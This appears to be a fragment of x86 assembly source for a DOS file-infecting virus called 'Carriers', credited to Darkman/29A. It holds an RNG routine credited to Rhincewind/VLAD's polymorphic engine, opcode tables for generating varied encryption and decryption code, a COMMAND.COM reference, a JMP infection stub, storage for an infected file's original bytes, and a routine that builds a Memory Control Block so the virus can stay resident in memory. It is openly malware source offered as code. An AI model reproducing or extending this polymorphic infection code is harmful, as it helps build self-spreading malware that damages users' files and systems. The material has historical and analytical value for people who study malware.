   ; Modified version of the Random Number Generator (RNG) used in the Rickety
   ; and Hardly Insidious yet New Chaos Engine v 1.00 [RHINCE] by
   ; Rhincewind/VLAD.
   get_rnd_num_ proc    near        ; Get 16-bit random number
            in      al,40h      ; AL = 8-bit random number
            mov     ah,al       ; AH =   "     "      "
            in      al,40h      ; AL =   "     "      "

   random_num   equ     word ptr $+01h  ; 16-bit random number
            adc     ax,00h      ; AX = 16-bit random number
            mov     [random_num],ax     ; Store 16-bit random number

            ret             ; Return!
            endp

   index_table  db      00000011b       ; Base register
            db      00000101b       ; Base pointer
            db      00000110b       ; Source index
   index_table_ db      00000111b       ; Destination/base register
            db      01000110b       ; Base pointer
            db      00000100b       ; Source index
            db      00000101b       ; Destination index
   decrypt_tbl  db      00000000b       ; ADD [reg16],imm
            db      00110000b       ; XOR [reg16],imm
            db      00101000b       ; SUB [reg16],imm
   inc_r16_tbl  db      01000000b       ; INC reg16
            dw      1100000010000011b   ; ADD reg16,imm8
            dw      1100000010000001b   ; ADD reg16,imm16
            dw      1110100010000001b   ; SUB reg16,imm16
   jmp_imm8_tbl db      01110011b       ; JAE imm8
            db      01110100b       ; JE imm8
            db      01110111b       ; JA imm8
   encrypt_tbl  db      00101010b       ; SUB reg8,reg8
            db      00110010b       ; XOR reg8,reg8
            db      00000010b       ; ADD reg8,reg8

   command_com  db      'COMMAND COM'       ; COMMAND.COM
   virus_offset equ     word ptr $+01h  ; Offset of virus within infected ...
   infect_code  db      11101001b,?,?   ; JMP imm16 (opcode 0e9h)
   virus_name   db      ' [Carriers]'       ; Name of the virus
   virus_author db      ' [Darkman/29A] '   ; Author of the virus
   origin_code  db      11001101b,00100000b,?
   code_end:
            db      15h dup(?)      ; Original code of infected file
   filename     db      80h dup(?)      ; Canonicalized filename
   ; DOS parameter list
   dpl_begin:
   dpl_ax       dw      ?           ; Accumulator register
   dpl_bx       dw      ?           ; Base register
   dpl_cx       dw      ?           ; Count register
   dpl_dx       dw      ?           ; Data register
   dpl_si       dw      ?           ; Source index
   dpl_di       dw      ?           ; Destination index
   dpl_ds       dw      ?           ; Data segment
   dpl_es       dw      ?           ; Extra segment
   dpl_reserved dw      00h         ; Reserved
   dpl_comp_id  dw      00h         ; Computer ID
   dpl_proc_id  dw      ?           ; Process ID
   dpl_end:
   data_buffer  db      (code_end-code_begin+1482h) dup(?)
   data_end:
   move_mcb:
            cld             ; Clear direction flag
            mov     cx,(mcb_end-mcb)/02h
            lea     di,code_begin+100h  ; DI = offset of code_begin
            lea     si,mcb+100h     ; SI = offset of mcb
            rep     movsw       ; Move Memory Control Block (MCB) ...

            jmp     virus_begin

   mcb      db      'Z'                 ; Last block in chain
            dw      08h         ; Memory Control Block (MCB) belon...
            dw      (data_end-virus_begin+0fh)/10h
            db      00h,00h,00h,'SC',06h dup(00h)
   mcb_end:

   end      code_begin
